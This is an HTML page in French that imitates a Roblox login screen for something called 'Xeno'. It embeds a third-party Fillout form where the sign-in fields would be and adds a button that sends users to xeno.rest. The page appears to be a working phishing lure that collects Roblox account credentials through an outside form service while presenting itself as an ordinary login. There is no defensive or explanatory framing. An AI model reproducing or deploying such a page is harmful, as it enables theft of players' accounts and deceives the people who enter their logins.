<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Connexion</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,Helvetica,sans-serif;
}

body{
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:linear-gradient(135deg,#0f172a,#1e293b,#111827);
    overflow:hidden;
    color:#fff;
}

/* Cercles lumineux */
body::before,
body::after{
    content:"";
    position:absolute;
    width:350px;
    height:350px;
    border-radius:50%;
    filter:blur(120px);
    z-index:-1;
}

body::before{
    background:#3b82f6;
    top:-120px;
    left:-120px;
}

body::after{
    background:#9333ea;
    bottom:-120px;
    right:-120px;
}

.card{
    width:420px;
    background:rgba(35,37,42,.82);
    backdrop-filter:blur(20px);
    -webkit-backdrop-filter:blur(20px);
    border:1px solid rgba(255,255,255,.08);
    border-radius:22px;
    padding:28px;
    box-shadow:
        0 25px 60px rgba(0,0,0,.55),
        0 0 30px rgba(59,130,246,.15);
    animation:fadeIn .7s ease;
}

.logo{
    text-align:center;
    color:#fff;
    font-size:30px;
    font-weight:bold;
    margin-bottom:8px;
    text-shadow:0 2px 8px rgba(0,0,0,.5);
}

.subtitle{
    text-align:center;
    color:#fff;
    margin-bottom:22px;
    font-size:14px;
    text-shadow:0 2px 8px rgba(0,0,0,.5);
}

@keyframes fadeIn{
    from{
        opacity:0;
        transform:translateY(25px);
    }
    to{
        opacity:1;
        transform:translateY(0);
    }
}
</style>
</head>

<body>

<div class="card">

    <div class="logo">Connexion à roblox pour xeno</div>

    <div class="subtitle">
        Veuillez vous connecter pour continuer
    </div>

    <!-- Nouveau formulaire Fillout -->
    <div
        style="width:100%;height:500px;"
        data-fillout-id="hRxA2yg21xus"
        data-fillout-embed-type="standard"
        data-fillout-inherit-parameters
        data-fillout-dynamic-resize>
    </div>

    <script src="https://server.fillout.com/embed/v1/"></script>

    <div style="margin-top:20px;">
        <button
            onclick="window.location.href='https://xeno.rest/';"
            style="
                width:100%;
                padding:14px;
                border:none;
                border-radius:12px;
                background:#3b82f6;
                color:white;
                font-size:16px;
                font-weight:bold;
                cursor:pointer;
            ">
            Continuer
        </button>
    </div>

</div>

</body>
</html>
